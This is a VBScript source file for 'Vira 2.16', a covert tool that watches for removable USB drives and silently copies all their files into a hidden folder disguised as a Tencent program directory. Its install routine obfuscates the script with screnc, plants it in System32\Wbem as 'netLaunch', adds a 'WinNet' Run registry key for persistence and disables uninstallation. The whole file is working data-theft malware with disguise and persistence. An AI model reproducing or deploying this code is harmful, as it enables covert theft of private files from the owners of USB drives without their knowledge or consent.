'Version 2.16 Ultimate
Option Explicit
On Error Resume Next

'************
' Constants
'************
Const ViraVersion = "2.16"
Const RETURN_SUCCESS = 0
Const RETURN_FAILURE = 1

Dim FlagFileNum, FlagFile, MaxCapacityGB, Destination, ConfigFile
Dim HasAdmin, Container, IsCopied(23)
Dim Shell, Fso, Fin, Fout
Set Shell = CreateObject("WScript.Shell")
Set Fso = CreateObject("Scripting.FileSystemObject")

' The only thing left customizable...
ConfigFile = "C:\Windows\System32\wbem\Repository\CONFIG.CTI"

'***************
' Main Program
'***************
If Wsh.Arguments.Count = 0 Then
  ProcessMain
Else
  Dim i, str
  For i = 0 To Wsh.Arguments.Count - 1
    str = LCase(Wsh.Arguments(i))
    If Chr(Asc(str)) = "/" Or Chr(Asc(str)) = "-" Then
      str = Mid(str, 2, Len(str)-1)
      Select Case str
        Case Else
          MsgBox "Unknown switch """ & Wsh.Arguments(i) & """", 16, "Vira " & ViraVersion & " Error"
          Wsh.Quit -1
      End Select
    Else
      Select Case str
        Case "help"
          MsgBox "XWH loves YZ.", 0, "Help"
          Wsh.Quit 0
        Case "execute"
          ProcessMain
        Case "install"
          InstallLocal
        Case "uninst"
          UninstLocal
        Case "uninstall"
          UninstLocal
        Case Else
          MsgBox "Unknown parameter """ & str & """", 16, "Vira " & ViraVersion & " Error"
          Wsh.Quit -1
      End Select
    End If
  Next
End If

'****************
' Main Function
'****************
Public Sub ProcessMain
  ViraInitialize
  Do
    ViraMain
    Wsh.Sleep 1000
  Loop
End Sub

'*************************
' Vira Process Functions
'*************************
Public Sub ViraInitialize()
  If ReadConfig() <> 0 Then Wsh.Quit 1
  Shell.Run "CMD.EXE /C MKDIR """ & Destination & """", 0, True
  Set Container = Fso.GetFolder(Destination)
  Container.Attributes = 7
  Dim i
  For i = 0 To 22
    IsCopied(i) = False
  Next
End Sub

Public Sub ViraMain()
  Dim DriveLetter, DriveReady, UDrive, i
  For i = 0 To 22
    DriveLetter = Chr(68 + i)
    DriveReady = False
    
    If Fso.DriveExists(DriveLetter) Then
      Set UDrive = Fso.GetDrive(DriveLetter)
      If UDrive.DriveType = 1 And Not IsCopied(i) Then
        IsCopied(i) = ProcessDrive(DriveLetter)
      End If
    Else
      IsCopied(i) = False
    End If
  Next
End Sub

Public Function ProcessDrive(DriveLetter)
  ProcessDrive = False
  Dim Target, UDrive
  Set UDrive = Fso.GetDrive(DriveLetter)
  Do
    Wsh.Sleep 500
  Loop Until UDrive.IsReady
  Target = Destination & Hex(UDrive.SerialNumber)
  If Fso.FolderExists(Target) Or Container.Size <= MaxCapacityGB*100000000 Then
    Dim i, FileCheck
    FileCheck = True
    For i = 0 to FlagFileNum - 1
      If Fso.FileExists(DriveLetter & ":\" & FlagFile(i)) Then
        FileCheck = False
        Exit For
      End If
    Next
    
    If FileCheck Then 'Copy this drive
      CopyDrive DriveLetter
      ProcessDrive = True
     End If
  End If
End Function

Public Sub CopyDrive(DriveLetter)
  Dim UDrive, File, TargetF, Target, TimeA, TimeB
  Set UDrive = Fso.GetDrive(DriveLetter)
  Target = Destination & Hex(UDrive.SerialNumber) & "\"
  Set UDrive = Nothing
  If Not Fso.FolderExists(Target) Then Fso.CreateFolder Target
  WriteDriveInfo DriveLetter, Target & "Vira.ini"
  
  TimeA = Timer()
  Fso.CopyFile DriveLetter & ":\*", Target, True
  Fso.CopyFolder DriveLetter & ":\*", Target, True
  TimeB = Timer()
  If TimeB < TimeA Then TimeB = TimeB + 86400
  Set File = Fso.OpenTextFile(Target & "Vira.ini", 8)
  Set TargetF = Fso.GetFolder(Target)
  File.WriteLine "AverageSpeed=" & ConvertSize(TargetF.Size/(TimeB-TimeA)) & "/s"
  File.Close
End Sub

Public Sub HarvestDrive(DriveLetter)
  ' Unfinished Yet
End Sub

Public Sub WriteDriveInfo(DriveLetter, FileName)
  Dim Fout, DriveInfo
  Set Fout = Fso.OpenTextFile(FileName, 2, True, 0)
  Set DriveInfo = Fso.GetDrive(DriveLetter)
  If DriveInfo Is Nothing Then Exit Sub
  Fout.WriteLine "[Vira]" & vbCrLf & "Version=" & ViraVersion
  Fout.WriteLine "OperationTime=" & Now()
  Fout.WriteLine "[DriveInfo]"
  Fout.WriteLine "SerialNumber=" & Hex(DriveInfo.SerialNumber)
  Fout.WriteLine "VolumeName=" & DriveInfo.VolumeName
  Fout.WriteLine "FileSystem=" & DriveInfo.FileSystem
  Fout.WriteLine "TotalSize=" & DriveInfo.TotalSize & " (" & ConvertSize(DriveInfo.TotalSize) & ")"
  Fout.WriteLine "FreeSpace=" & DriveInfo.FreeSpace & " (" & ConvertSize(DriveInfo.FreeSpace) & ")"
  Fout.Close
End Sub

'******************
' Shell Functions
'******************

Public Sub InstallLocal()
  If Not AdminTest() Then
    MsgBox "Installation requires Administrator rights!", 16, "Vira " & ViraVersion & " Error"
    Wsh.Quit 1
  End If
  Dim TempString, i, Input
  If MsgBox("Customize Vira?", 324, "Vira " & ViraVersion) = 6 Then
    MsgBox "Please follow the instructions and enter information PROPERLY." & vbCrLf & _
           "Any errorneous data may lead to unpredictable behaviour of Vira.", 64, "Vira " & ViraVersion
    FlagFileNum = CInt(InputBox("How many flag files are there to recognize ""protected drive""?", _
                                "Vira " & ViraVersion, 0))
    If FlagFileNum > 0 Then TempString = InputBox("Enter flag file 1", "Vira " & ViraVersion, "setup.exe")
    For i = 2 to FlagFileNum
      TempString = TempString & "|" & InputBox("Enter flag file " & i, "Vira " & ViraVersion, "setup.exe")
    Next
    FlagFile = TempString
    
    MaxCapacityGB = CInt(InputBox("How much disk space(in GB) is allocated for Vira?", _
                                  "Vira " & ViraVersion, "32"))
    Destination = InputBox("Where can Vira hide the files ""harvested""?" & vbCrLf & _
                           "Please end with a backslash [\]", _
                           "Vira " & ViraVersion, "D:\Program Files\Tencent\QQMaster\")
  Else
    FlagFile = "setup.exe|bootmgr"
    MaxCapacityGB = 32
    Destination = "D:\Program Files\Tencent\QQMaster"
  End If
  WriteConfig FlagFile, MaxCapacityGB, Destination
  
  TempString = Fso.GetParentFolderName(Wsh.ScriptFullName) & "\vtemp.vbe"
  EndProcess "netLaunch.exe"
  If Fso.FileExists("screnc.exe") Then
    Shell.Run "screnc.exe /s """ & Wsh.ScriptFullName & """ """ & TempString & """"
    Fso.CopyFile TempString, "C:\Windows\system32\Wbem\netLaunch.vbe", True
    Fso.DeleteFile TempString, True
  Else
    Fso.CopyFile Wsh.ScriptFullName, "C:\Windows\system32\Wbem\netLaunch.vbe", True
  End If
  Fso.CopyFile Wsh.FullName, "C:\Windows\system32\Wbem\netLaunch.exe", True
  
  TempString = "C:\Windows\system32\Wbem\netLaunch.exe C:\Windows\system32\Wbem\netLaunch.vbe"
  Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinNet", _
          TempString, "REG_SZ"
  Shell.Run TempString, 0, False
  MsgBox "Installation Complete!", 64, "Vira " & ViraVersion
  Wsh.Quit 0
End Sub

Public Sub UninstLocal()
  MsgBox "Local uninstallation is disabled for security reasons.", 64, "Vira " & ViraVersion
End Sub

Public Sub GenuineUninstLocal()
  If Not AdminTest() Then
    MsgBox "Uninstallation requires Administrator rights!", 16, "Vira " & ViraVersion & " Error"
    Wsh.Quit 1
  End If
  EndProcess "netLaunch.exe"
  Fso.DeleteFile "C:\Windows\system32\Wbem\netLaunch.exe", True
  Fso.DeleteFile "C:\Windows\system32\Wbem\netLaunch.vbe", True
  Shell.RegDelete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinNet"
  MsgBox "Uninstallation Complete!", 64, "Vira " & ViraVersion
  Wsh.Quit 0
End Sub

Public Function AdminTest()
  If HasAdmin = 1 Then
    AdminTest = True
    Exit Function
  ElseIf HasAdmin = 2 Then
    AdminTest = False
    Exit Function
  End If
  On Error Resume Next
  Dim TestDir
  TestDir = "C:\Windows\AdminTest\"
  Fso.CreateFolder TestDir
  Wsh.Sleep 1000
  AdminTest = Fso.FolderExists(TestDir)
  If AdminTest Then
    Fso.DeleteFolder TestDir
    HasAdmin = 1
  Else
    HasAdmin = 2
  End If
End Function

Public Sub EndProcess(ProcessName)
  Shell.Run "TASKKILL.EXE /F /FI ""IMAGENAME eq " & ProcessName & """", 0, True
End Sub

Public Function ReadConfig()
  On Error Resume Next
  If Not Fso.FileExists(ConfigFile) Then
    If WriteConfig(Array("Setup.exe", "bootmgr"), 32, "D:\Program Files\Tencent\QQMaster\") <> 0 Then
      ReadConfig = 1
      Exit Function
    End If
  End If
  Dim File
  Set File = Fso.OpenTextFile(ConfigFile, 1)
  str = File.ReadLine()
  If str <> "VR2XF" Then
    File.Close
    If WriteConfig(Array("Setup.exe", "bootmgr"), 32, "D:\Program Files\Tencent\QQMaster\") <> 0 Then
      ReadConfig = 1
      Exit Function
    End If
    ReadConfig = ReadConfig()
    Exit Function
  End If
  FlagFile = Split(File.ReadLine(), "|")
  FlagFileNum = UBound(FlagFile)
  MaxCapacityGB = CDbl(File.ReadLine())
  Destination = File.ReadLine()
  If File.AtEndOfStream Then
    File.Close
    ReadConfig = 1
    Exit Function
  End If
  File.Close
  ReadConfig = 0
End Function

Public Function WriteConfig(FlagFiles, Capacity, Storage)
  If Not AdminTest() Or Not IsArray(FlagFiles) Then
    WriteConfig = 1
    Exit Function
  End If
  Dim File, FileNames, FlagFileNum, i
  FlagFileNum = UBound(FlagFiles)
  If FlagFileNum = 0 Then
    WriteConfig = 1
    Exit Function
  End If
  FileNames = FlagFiles(0)
  If FlagFileNum > 1 Then
    For i = 1 To FlagFileNum - 1
      FileNames = FileNames & "|" & FlagFiles(i)
    Next
  End If
  Set File = Fso.OpenTextFile(ConfigFile, 2, True)
  File.WriteLine "VR2XF" 'File Valiation
  File.WriteLine FileNames
  File.WriteLine CDbl(Capacity)
  File.WriteLine Storage
  File.WriteLine "XEOF"
  File.Close
  WriteConfig = 0
End Function

Public Function ConvertSize(ByVal dSize)
  Dim SizeSuffix, PowerLevel
  SizeSuffix = Array("B", "KB", "MB", "GB", "TB")
  For PowerLevel = 0 To 4
    If dSize >= 1024 Then
      dSize = dSize / 1024
    Else
      Exit For
    End If
  Next
  ConvertSize = FormatNumber(dSize, 2, True) & SizeSuffix(PowerLevel)
End Function

Public Sub Include(InclFile)
  Dim File, InclContent 
  Set File = Fso.OpenTextFile(InclFile) 
  InclContent = File.ReadAll() 
  File.Close
  ExecuteGlobal InclContent
End Sub 

'*****************
' End of Program
'*****************
